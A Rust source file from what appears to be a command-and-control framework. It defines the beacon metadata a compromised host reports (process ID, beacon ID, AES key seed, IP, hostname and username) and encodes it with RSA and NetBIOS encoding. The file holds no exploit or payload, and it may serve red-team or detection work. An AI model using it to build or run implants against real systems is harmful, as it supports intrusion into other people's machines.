// Copyright (c) 2024 ThottySploity

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

use crate::utilities::Utils;
use crate::encoding::netbios::Netbios;
use crate::encryption::rsa::Rsa;

use anyhow::Result;

use serde::{Deserialize, Serialize};
use rsa::{RsaPublicKey, RsaPrivateKey};

#[derive(Serialize, Deserialize)]
pub struct MetaData {
    pub pid: u32,      // Process ID
    pub bid: [u8; 4],  // Random four byte beacon ID
    pub aes: [u8; 16], // 16 Random bytes from which the AES-GCM key is derived
    pub port: u32,     // Port on which the beacon connected (used for listeners)
    pub flag: u32,     // Which architecture (x86 or x64)
    pub ip: [u8; 4],   // The four octects of the IP address
    pub info: String,  // Hostname\tUsername\tBeaconProcess
}

impl MetaData {

    pub fn new(pid: u32, bid: [u8; 4], aes: [u8; 16], port: u32, flag: u32, ip: [u8; 4], info: String) -> Self {
        // Filling a new MetaData structure to be encoded
        Self {
            pid: pid,
            bid: bid,
            aes: aes,
            port: port,
            flag: flag,
            ip: ip,
            info: info,
        }
    }

    pub fn encode(self, public_key: RsaPublicKey) -> Result<String> {
        // Encoding the MetaData struct to give us an encrypted String equivalent.
        let json_encoded = Utils::struct_to_json(self)?;
        let encrypted = Rsa::encrypt(public_key, json_encoded.as_bytes().to_vec())?;
        Ok(Netbios::encode(&encrypted))
    }

    pub fn decode(private_key: RsaPrivateKey, data: String) -> Result<MetaData> {
        // Decoding a received metadata string to it's structure equivalent.
        let decoded_payload = Netbios::decode(data);
        let decrypted_payload = Rsa::decrypt(private_key, decoded_payload)?;
        Ok(Utils::json_to_struct(Utils::convert(&decrypted_payload)?)?)
    }
}